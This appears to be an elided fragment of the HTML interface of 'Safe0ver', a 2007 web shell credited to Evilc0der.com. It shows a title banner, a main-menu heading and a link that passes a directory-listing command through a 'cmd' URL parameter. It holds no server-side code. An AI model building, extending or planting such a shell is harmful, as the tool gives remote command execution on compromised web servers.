  ...
  <table nowrap width=100% border="0" cellpadding="0" cellspacing="0">
    <tr>
      <td width="100%" class="silver border"><center>
          <strong> <font size=3>Safe0ver By Evilc0der.com - Bet@ Versiyon - 7 Subat 2007</font> </strong>
      </center></td>
    </tr>
  </table>
    ...
    <td width="100%" NOWRAP><br>
      ...
      <tr>
       <td width="100%" class="border">
        <center>&nbsp;-<[{ Safe0ver Main Menu }]>-&nbsp;</center>
       </td>
      </tr>
     </table>
     <br>
     ...
     <table border="0" NOWRAP>
       ...
       <td valign="top" class="silver border">
            <a href="?&s=r&cmd=dir&dir=.">&nbsp;&nbsp;<font color="navy"><strong>##Safe0ver##</strong></font></a>&nbsp;&nbsp;      </td>
     ...
     <br>
      ...
      <tr>
       <td width="100%" class="silver border">
        <center>&nbsp;Safe0ver By Evilc0der.com - Bet@ Versiyon - 7 Subat 2007&nbsp;</center>
       </td>
      </tr>
     </table>
         </td>
